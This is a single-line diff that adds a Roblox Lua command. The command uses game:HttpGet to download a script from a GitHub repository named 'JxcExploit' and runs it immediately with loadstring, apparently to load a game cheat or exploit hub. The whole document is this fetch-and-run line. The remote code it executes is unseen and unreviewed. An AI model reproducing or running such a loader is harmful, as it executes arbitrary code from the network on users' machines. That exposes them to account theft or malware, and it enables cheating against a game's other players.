@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/northwind/main/jxcware%20open%20source"))()
